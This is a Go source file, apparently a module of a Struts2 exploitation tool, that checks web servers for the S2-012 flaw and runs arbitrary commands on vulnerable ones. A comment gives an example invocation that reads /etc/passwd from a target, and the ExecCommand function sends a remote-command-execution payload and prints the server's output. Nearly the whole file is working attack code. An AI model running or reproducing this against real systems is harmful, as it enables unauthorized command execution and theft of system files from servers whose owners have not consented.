package s012

import (
	"ST2G/cvemod/utils"
	"fmt"
	"log"
	"net/url"
	"strings"
)

/*
ST2SG.exe --url http://192.168.123.128:8080/S2-012/user.action --vn 12 --mode exec --data "name=fuckit" --cmd "cat /etc/passwd"
*/

func Check(targetUrl string, postData string) {
	respString := utils.PostFunc4Struts2(targetUrl, postData, "", utils.PocS012Check)
	if utils.IfContainsStr(respString, utils.CheckFlag) {
		log.Printf("%v %v", utils.Green(targetUrl), utils.Red("*Found Struts2-012！"))
	} else {
		log.Printf("%s Struts2-012 Not Vulnerable.", utils.Green(targetUrl))
	}
}
func ExecCommand(targetUrl string, command string, postData string) {
	respString := utils.PostFunc4Struts2(targetUrl, postData, "", utils.PocS012Exec(command))
	respString = strings.Replace(url.QueryEscape(respString), "%00", "", -1)
	fmt.Println(url.QueryUnescape(respString[13:]))
}
